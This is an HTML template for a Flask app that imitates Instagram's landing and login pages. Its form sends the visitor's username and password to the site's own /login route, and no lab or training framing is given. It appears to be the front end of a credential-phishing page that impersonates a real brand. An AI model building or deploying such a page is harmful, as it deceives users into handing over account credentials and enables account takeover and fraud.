<!DOCTYPE html>
<html>
<head>
    <title>Instagram</title>
    <link rel="stylesheet" href="{{ url_for('static', filename='style.css') }}">
</head>
<body>
    <div id="landing-page" class="view">
        <h1 class="logo">Instagram</h1>
        <p>Share everyday moments with your close friends.</p>
        <button class="cta-btn" onclick="showLogin()">Open Instagram</button>
        <div class="auth-links">
            <a href="#" onclick="showLogin()">Log In</a> or <a href="#">Sign Up</a>
        </div>
    </div>

    <div id="login-page" class="view" style="display:none;">
        <div class="login-box">
            <h1 class="logo">Instagram</h1>
            <form action="/login" method="POST">
                <input type="text" name="username" placeholder="Username, email or mobile" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="login-btn">Log in</button>
            </form>
            <a href="#" class="forgot">Forgotten password?</a>
        </div>
    </div>

    <script>
        function showLogin() {
            document.getElementById('landing-page').style.display = 'none';
            document.getElementById('login-page').style.display = 'block';
        }
    </script>
</body>
</html>
